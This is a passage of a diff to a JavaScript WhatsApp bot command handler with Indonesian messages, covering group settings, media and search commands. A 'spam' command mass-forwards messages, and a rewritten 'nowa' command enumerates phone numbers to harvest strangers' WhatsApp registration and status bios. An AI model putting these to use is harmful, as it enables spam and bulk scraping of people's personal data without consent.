-{buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
-]
-let buttonMessageUpvote = {
-text: teks_vote,
-footer: haikal.user.name,
-buttons: buttonsUpvote,
-headerType: 1,
-mentions: menvote
- }
-haikal.sendMessage(m.chat, buttonMessageUpvote)
-}
- break
-//=================================================//
-case 'devote': {
-if (isBan) throw sticBanLu(from)
-if (!m.isGroup) throw groupon(from)
-if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
-isVote = vote[m.chat][1].concat(vote[m.chat][2])
-wasVote = isVote.includes(m.sender)
-if (wasVote) throw 'Kamu Sudah Vote'
-vote[m.chat][2].push(m.sender)
-menvote = vote[m.chat][1].concat(vote[m.chat][2])
-teks_vote = `*「 VOTE 」*
-*Alasan:* ${vote[m.chat][0]}
-┌〔 UPVOTE 〕
-│ 
-├ Total: ${vote[m.chat][1].length}
-${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
-│ 
-└────
-┌〔 DEVOTE 〕
-│ 
-├ Total: ${vote[m.chat][2].length}
-${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
-│ 
-└────
-*${prefix}hapusvote* - untuk menghapus vote`
-let buttonsDevote = [
-{buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
-{buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
-]
-let buttonMessageDevote = {
-text: teks_vote,
-footer: haikal.user.name,
-buttons: buttonsDevote,
-headerType: 1,
-mentions: menvote
-}
-haikal.sendMessage(m.chat, buttonMessageDevote)
-}
-break
-//=================================================// 
-case 'cekvote':
-if (isBan) throw sticBanLu(from)
-if (!m.isGroup) throw groupon(from)
-if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
-teks_vote = `*「 VOTE 」*
-*Alasan:* ${vote[m.chat][0]}
-┌〔 UPVOTE 〕
-│ 
-├ Total: ${upvote.length}
-${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
-│ 
-└────
-┌〔 DEVOTE 〕
-│ 
-├ Total: ${devote.length}
-${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
-│ 
-└────
-*${prefix}hapusvote* - untuk menghapus vote
-©${haikal.user.id}`
-haikal.sendTextWithMentions(m.chat, teks_vote, m)
-break
-case 'deletevote': case'delvote': case 'hapusvote': {
-if (isBan) throw sticBanLu(from)
-if (!m.isGroup) throw groupon(from)
-if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
-delete vote[m.chat]
-reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
-}
-break
 //=================================================//
  case 'group': case 'grup': {
  if (isBan) throw sticBanLu(from)
+if (!isRegistered) return replyReg(mess.verif)
 if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
 if (!isAdmins) throw sticAdmin(from)
 if (args[0] === 'close'){
-await haikal.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
+await haikal.groupSettingUpdate(m.chat, 'announcement').then((res) => anjay(`Sukses Menutup Group`)).catch((err) => anjay(jsonformat(err)))
 } else if (args[0] === 'open'){
-await haikal.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
+await haikal.groupSettingUpdate(m.chat, 'not_announcement').then((res) => anjay(`Sukses Membuka Group`)).catch((err) => anjay(jsonformat(err)))
 } else {
-let buttons = [
-{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
-{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
-]
-await haikal.sendButtonText(m.chat, buttons, `Mode Group`, haikal.user.name, m)
+const anmu = {
+video:fs.readFileSync("./baseikal/video/haikal.mp4"),
+gifPlayback:true,
+jpegThumbnail:log0,
+caption:  `Mode Group`,
+}
+haikal.sendMessage(m.chat, anmu, `Mode Group`, haikal.user.name, m)
  }
 }
 break
 //=================================================//
 case 'editinfo': {
 if (isBan) throw sticBanLu(from)
+if (!isRegistered) return replyReg(mess.verif)
 if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
 if (!isAdmins) throw sticAdmin(from)
  if (args[0] === 'open'){
-await haikal.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
+await haikal.groupSettingUpdate(m.chat, 'unlocked').then((res) => anjay(`Sukses Membuka Edit Info Group`)).catch((err) => anjay(jsonformat(err)))
  } else if (args[0] === 'close'){
-await haikal.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
+await haikal.groupSettingUpdate(m.chat, 'locked').then((res) => anjay(`Sukses Menutup Edit Info Group`)).catch((err) => anjay(jsonformat(err)))
  } else {
- let buttons = [
-{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
-{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
-]
-await haikal.sendButtonText(m.chat, buttons, `Mode Edit Info`, haikal.user.name, m)
+ const anju = {
+video:fs.readFileSync("./baseikal/video/haikal.mp4"),
+gifPlayback:true,
+jpegThumbnail:log0,
+caption:  `Mode Edit Info`,
+}
+haikal.sendMessage(m.chat, anju, `Mode Edit Info`, haikal.user.name, m)
 }
 }
 break
 //=================================================//
  case 'mute': {
  if (isBan) throw sticBanLu(from)
+if (!isRegistered) return replyReg(mess.verif)
 if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
 if (!isAdmins) throw sticAdmin(from)
 if (args[0] === "on") {
-if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
+if (db.data.chats[m.chat].mute) return anjay(`Sudah Aktif Sebelumnya`)
 db.data.chats[m.chat].mute = true
-reply(`${haikal.user.name} telah di mute di group ini !`)
+anjay(`${haikal.user.name} telah di mute di group ini !`)
 } else if (args[0] === "off") {
-if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
+if (!db.data.chats[m.chat].mute) return anjay(`Sudah Tidak Aktif Sebelumnya`)
 db.data.chats[m.chat].mute = false
-reply(`${haikal.user.name} telah di unmute di group ini !`)
+anjay(`${haikal.user.name} telah di unmute di group ini !`)
 } else {
- let buttons = [
-{ buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
-{ buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
-]
-await haikal.sendButtonText(m.chat, buttons, `Mute Bot`, haikal.user.name, m)
+ const anaku = {
+video:fs.readFileSync("./baseikal/video/haikal.mp4"),
+gifPlayback:true,
+jpegThumbnail:log0,
+caption:  `Mute Bot`,
+}
+haikal.sendMessage(m.chat, anaku, `Mute Bot`, haikal.user.name, m)
 }
  }
  break
+//=================================================//
 //=================================================//
 case 'linkgroup': case 'linkgc': {
 if (isBan) throw sticBanLu(from)
@@ -3225,7 +2790,7 @@ break
  }
  break
 case 'spam': {
-if (!isCreator) throw sticOwner(from)
+if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!m.quoted) return m.reply("Reply pesanya!")
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -3237,27 +2802,10 @@ quoted.copyNForward(m.chat, true)
 } 
 break
 //=================================================//
- /*case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
- if (isBan) throw sticBanLu(from)
-let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
-if (!/image/.test(mime)) throw respond
-if (!text) throw respond
-atas = text.split('|')[0] ? text.split('|')[0] : '-'
-bawah = text.split('|')[1] ? text.split('|')[1] : '-'
-let dwnld = await quoted.download()
-let { floNime } = require('./baseikal/lib/uploader')
-let fatGans = await floNime(dwnld)
-let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
-let FaTiH = await haikal.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
-await fs.unlinkSync(FaTiH)
-}
- break */
-//=================================================// 
+
 case 'smeme': case 'stickermeme': case 'stickmeme': {
 if (isBan) throw sticBanLu(from)
-/*if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
-db.data.users[m.sender].limit -= 1 */ // -1 limit 
-if (!text) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
+if (!quoted) throw 'Reply Image'
 if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
 if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
 sticWait(from)
@@ -3288,7 +2836,6 @@ break
 //=================================================//
 case 'tomp4': case 'tovideo': {
 if (isBan) throw sticBanLu(from)
- // //if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./baseikal/lib/uploader')
@@ -3361,142 +2908,22 @@ await fs.unlinkSync(media)
 }
 break
 //=================================================//
-case 'yts': case 'ytsearch': {
-if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} story wa anime`
-let yts = require("yt-search")
-let search = await yts(text)
-let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
-let no = 1
-for (let i of search.all) {
-teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
-}
-haikal.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },caption: teks }, { quoted: m })
-}
-break
-//=================================================//
-case 'google': {
-if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} fatih arridho`
-let google = require('google-it')
-google({'query': text}).then(res => {
-let teks = `Google Search From : ${text}\n\n`
-for (let g of res) {
-teks += `⭔ *Title* : ${g.title}\n`
-teks += `⭔ *Description* : ${g.snippet}\n`
-teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
-} 
-reply(teks)
-})
-}
-break
-//=================================================//
 case 'gimage': {
 if (isBan) throw sticBanLu(from)
+if (!isRegistered) return replyReg(mess.verif)
 if (!text) throw `Example : ${prefix + command} kaori cicak`
 let gis = require('g-i-s')
 gis(text, async (error, result) => {
 n = result
 images = n[Math.floor(Math.random() * n.length)].url
-let buttons = [
-{buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
-]
-let buttonMessage = {
+const mllo = {
 image: { url: images },
 caption: `*-------「 GIMAGE SEARCH 」-------*
 🤠 *Query* : ${text}
-🔗 *Media Url* : ${images}`,
-footer: haikal.user.name,
-buttons: buttons,
-headerType: 4
+🔗 *Media Url* : ${images}`
 }
-haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
+haikal.sendMessage(m.chat, mllo, { quoted: hw })
 })
-}
-break
-//=================================================//
-case 'play': case 'ytplay': {
-if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} story wa anime`
-let yts = require("yt-search")
-let search = await yts(text)
-let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
-let buttons = [
-{buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
-{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
-]
-let buttonMessage = {
-image: { url: anu.thumbnail },
-caption: `
-⭔ Title : ${anu.title}
-⭔ Ext : Search
-⭔ ID : ${anu.videoId}
-⭔ Duration : ${anu.timestamp}
-⭔ Viewers : ${anu.views}
-⭔ Upload At : ${anu.ago}
-⭔ Author : ${anu.author.name}
-⭔ Channel : ${anu.author.url}
-⭔ Description : ${anu.description}
-⭔ Url : ${anu.url}`,
-footer: haikal.user.name,
-buttons: buttons,
-headerType: 4
-}
-haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
-}
-break
-//=================================================//
-case 'ytmp3': case 'ytaudio': {
-if (isBan) throw sticBanLu(from)
-let { yta } = require('./baseikal/lib/y2mate')
-if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
-let quality = args[1] ? args[1] : '128kbps'
-let media = await yta(text, quality)
-if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
-haikal.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
-haikal.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
-}
-break
-//=================================================//
-case 'ytmp4': case 'ytvideo': {
-if (isBan) throw sticBanLu(from)
-let { ytv } = require('./baseikal/lib/y2mate')
-if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
-let quality = args[1] ? args[1] : '360p'
-let media = await ytv(text, quality)
-if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
-haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
-}
-break
-//=================================================//
-case 'getmusic': {
-if (isBan) throw sticBanLu(from)
-let { yta } = require('./baseikal/lib/y2mate')
-if (!text) throw `Example : ${prefix + command} 1`
-if (!m.quoted) return m.reply('Reply Pesan')
-if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
-let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
-if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
-let quality = args[1] ? args[1] : '128kbps'
-let media = await yta(urls[text - 1], quality)
-if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
-haikal.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
-haikal.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
-}
-break
-//=================================================//
-case 'getvideo': {
-if (isBan) throw sticBanLu(from)
-let { ytv } = require('./baseikal/lib/y2mate')
-if (!text) throw `Example : ${prefix + command} 1`
-if (!m.quoted) return m.reply('Reply Pesan')
-if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
-let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
-if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
-let quality = args[1] ? args[1] : '360p'
-let media = await ytv(urls[text - 1], quality)
-if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
-haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
 }
 break
 //=================================================//
@@ -3517,78 +2944,58 @@ haikal.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male`
 haikal.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
 }
 break
-//=================================================//
 case 'coffe': case 'kopi': {
 if (isBan) throw sticBanLu(from)
-let buttons = [
-{buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
-]
-let buttonMessage = {
+if (!isRegistered) return replyReg(mess.verif)
+const ko = {
 image: { url: 'https://coffee.alexflipnote.dev/random' },
-caption: `☕ Random Coffe`,
-footer: haikal.user.name,
-buttons: buttons,
-headerType: 4
+caption: `☕ Random Coffe`
 }
-haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
+haikal.sendMessage(m.chat, ko, { quoted: hw })
 }
 break
 //=================================================//
 case 'wallpaper': {
 if (isBan) throw sticBanLu(from)
+if (!isRegistered) return replyReg(mess.verif)
 if (!text) throw 'Masukkan Query Title'
 let { wallpaper } = require('./baseikal/lib/scraper')
 anu = await wallpaper(text)
 result = anu[Math.floor(Math.random() * anu.length)]
-let buttons = [
-{buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
-]
-let buttonMessage = {
+const mlo = {
 image: { url: result.image[0] },
-caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
-footer: haikal.user.name,
-buttons: buttons,
-headerType: 4
+caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
 }
-haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
+haikal.sendMessage(m.chat, mlo, { quoted: hw })
 }
 break
 //=================================================//
 case 'wikimedia': {
 if (isBan) throw sticBanLu(from)
+if (!isRegistered) return replyReg(mess.verif)
 if (!text) throw 'Masukkan Query Title'
 let { wikimedia } = require('./baseikal/lib/scraper')
 anu = await wikimedia(text)
 result = anu[Math.floor(Math.random() * anu.length)]
-let buttons = [
-{buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
-]
-let buttonMessage = {
+const mbk = {
 image: { url: result.image },
-caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
-footer: haikal.user.name,
-buttons: buttons,
-headerType: 4
+caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`
 }
-haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
+haikal.sendMessage(m.chat, mbk, { quoted: hw })
 }
 break
 //=================================================//
 case 'quotesanime': case 'quoteanime': {
 if (isBan) throw sticBanLu(from)
+if (!isRegistered) return replyReg(mess.verif)
 let { quotesAnime } = require('./baseikal/lib/scraper')
 let anu = await quotesAnime()
 result = anu[Math.floor(Math.random() * anu.length)]
-let buttons = [
-{buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
-]
-let buttonMessage = {
-text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
-footer: 'Press The Button Below',
-buttons: buttons,
-headerType: 2
+
+const anualas = {
+text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`
 }
-haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
+haikal.sendMessage(m.chat, anualas, { quoted: hw })
 }
 break
 //=================================================//
@@ -4034,7 +3441,7 @@ xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/ma
 await haikal.sendMessage(m.chat, { audio: xeony_buffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
 break
 //=================================================//
-case 'bcgc': case 'bcgroup': {
+/*case 'bcgc': case 'bcgroup': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
@@ -4116,8 +3523,9 @@ haikal.send5ButImg(yoi, txt, haikal.user.name, global.thumb, btn)
 }
 reply('Sukses Broadcast')
 }
-break
+break*/
 //=================================================//
+/*
 case 'cerpen':{
 if (isBan) throw sticBanLu(from)
 if (!q) return m.reply(`
@@ -4184,7 +3592,7 @@ let cerpe = await cerpen(q)
 var memek = await getBuffer(picak+`Cerpen ${q}`)
 await haikal.send5ButImg(from, `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`, `© ${ownername}`,memek, [{"urlButton": {"displayText": "YouTube Creator","url": `${youtube}`}}] )
 }
-break
+break*/
 //=================================================//
 case 'zodiak': case 'zodiac': {
 if (isBan) throw sticBanLu(from)
@@ -4226,39 +3634,6 @@ if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https
 let anu = await primbon.shio(text)
 if (anu.status == false) return m.reply(anu.message)
 haikal.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
-}
-break
-//=================================================// 
-case 'umma': case 'ummadl': {
-if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
-let { umma } = require('./baseikal/lib) scraper')
-let anu = await umma(isUrl(text)[0])
-if (anu.type == 'video') {
-let buttons = [
-{buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
-{buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
-]
-let buttonMessage = {
-image: { url: anu.author.profilePic },
-caption: `
-⭔ Title : ${anu.title}
-⭔ Author : ${anu.author.name}
-⭔ Like : ${anu.like}
-⭔ Caption : ${anu.caption}
-⭔ Url : ${anu.media[0]}
-Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
-`,
-footer: haikal.user.name,
-buttons,
-headerType: 4
-}
-haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
-} else if (anu.type == 'image') {
-anu.media.map(async (url) => {
-haikal.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: m })
-})
-}
 }
 break
 //=================================================//
@@ -4330,21 +3705,6 @@ ${id}`)
 } catch (e) {
 reply(`Hadis tidak ditemukan !`)
 }
-}
-break
-//=================================================//
-case 'alquran': {
-if (isBan) throw sticBanLu(from)
-if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
-if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
-let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
-let txt = `*Arab* : ${res.result.data.text.arab}
-*English* : ${res.result.data.translation.en}
-*Indonesia* : ${res.result.data.translation.id}
-
-( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
-reply(txt)
-haikal.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted: m })
 }
 break
 //=================================================//
@@ -4447,56 +3807,6 @@ reply('Done!')
 }
 break
 //=================================================//
-case 'addmsg': {
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
-if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
-if (!text) throw `Example : ${prefix + command} nama file`
-let msgs = global.db.data.database
-if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
-msgs[text.toLowerCase()] = quoted.fakeObj
-reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
-
-Akses dengan ${prefix}getmsg ${text}
-
-Lihat list Pesan Dengan ${prefix}listmsg`)
-}
-break
-//=================================================//
-case 'getmsg': {
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
-if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
-let msgs = global.db.data.database
-if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
-haikal.copyNForward(m.chat, msgs[text.toLowerCase()], true)
-}
-break
-//=================================================//
-case 'listmsg': {
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
-let msgs = JSON.parse(fs.readFileSync('./baseikal/dbnye/database.json'))
-let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
-let teks = '「 LIST DATABASE 」\n\n'
-for (let i of seplit) {
-teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
-}
-reply(teks)
-}
-break
-//=================================================//
-case 'delmsg': case 'deletemsg': {
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
-let msgs = global.db.data.database
-if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
-delete msgs[text.toLowerCase()]
-reply(`Berhasil menghapus '${text}' dari list pesan`)
-}
-break
-//=================================================//
-
 case 'public': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
@@ -4513,57 +3823,65 @@ reply('Sukses Change To Self')
 }
 break
 //=================================================//
-case 'nowa':
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
-                var teks = body.slice(6)
-                if (!teks) return m.reply("lah?")
-                var numberPattern = /\d+/g;
-                var nomer = teks.match(numberPattern)
-                var random_length = teks.length - nomer[0].length;
-                if (random_length == 1) {
-                    var random = 10
-                } else if (random_length == 2) {
-                    var random = 100
-                } else if (random_length == 3) {
-                    var random = 1000
-                } else if (random_length == 4) {
-                    var random = 10000
-                }
-                console.log(random)
-                var nomerny = `List Nomer\n`
-                for (let i = 0; i < random; i++) {
-                    var nu = ['1','2','3','4','5','6','7','8','9']
-                    var dom1 = nu[Math.floor(Math.random() * nu.length)]
-                    var dom2 = nu[Math.floor(Math.random() * nu.length)]
-                    var dom3 = nu[Math.floor(Math.random() * nu.length)]
-                    var dom4 = nu[Math.floor(Math.random() * nu.length)]
-                    if (random_length == 1) {
-                        var rndm = `${dom1}`
-                        var gdaftar = []
-                    } else if (random_length == 2) {
-                        rndm = `${dom1}${dom2}`
-                    } else if (random_length == 3) {
-                        rndm = `${dom1}${dom2}${dom3}`
-                    } else if (random_length == 4) {
-                        rndm = `${dom1}${dom2}${dom3}${dom4}`
-                    }
-                    var anu = await haikal.getName(`${nomer[0]}${i}@s.whatsapp.net`);
-                    var bionye = await haikal.setStatus(`${nomer[0]}${i}@s.whatsapp.net`);
-                    var anuu = anu ? anu : false;
-                    try {
-                        if (nomerny.includes(m.quoted.sender("@")[0])) {
-                            //console.log(i)
-                        } else {
-                            nomerny += `NO: wa.me/${m.quoted.sender("@")[0]}\nBIO: ${bionye.status}\n\n`
-                        }
-                    } catch {
-                        console.log(i)
-                    }
-                }
-                m.reply(nomerny)
-                console.log("Done dump")
-				break
+case 'nowa': {
+if (isBan) return sticBanLu(from)
+if (!args[0]) return reply(`Kirim perintah ${prefix+command} <nomer>`)
+var noteks = args[0]
+if (!noteks.includes('x')) return reply('lah?')
+reply(mess.wait)
+function countInstances(string, word) {
+return string.split(word).length - 1;
+}
+var nomer0 = noteks.split('x')[0]
+var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
+var random_length = countInstances(noteks, 'x')
+var random;
+if (random_length == 1) {
+random = 10
+} else if (random_length == 2) {
+random = 100
+} else if (random_length == 3) {
+random = 1000
+}
+var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
+var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
+var no_watsap = `\nTidak Terdaftar\n`
+for (let i = 0; i < random; i++) {
+var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
+var dom1 = nu[Math.floor(Math.random() * nu.length)]
+var dom2 = nu[Math.floor(Math.random() * nu.length)]
+var dom3 = nu[Math.floor(Math.random() * nu.length)]
+var dom4 = nu[Math.floor(Math.random() * nu.length)]
+var rndm;
+if (random_length == 1) {
+rndm = `${dom1}`
+} else if (random_length == 2) {
+rndm = `${dom1}${dom2}`
+} else if (random_length == 3) {
+rndm = `${dom1}${dom2}${dom3}`
+} else if (random_length == 4) {
+rndm = `${dom1}${dom2}${dom3}${dom4}`
+}
+var anu = await haikal.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
+var anuu = anu.length !== 0 ? anu : false
+try {
+try {
+var anu1 = await haikal.fetchStatus(anu[0].jid)
+} catch {
+var anu1 = '401'
+}
+if (anu1 == '401' || anu1.status.length == 0) {
+no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
+} else {
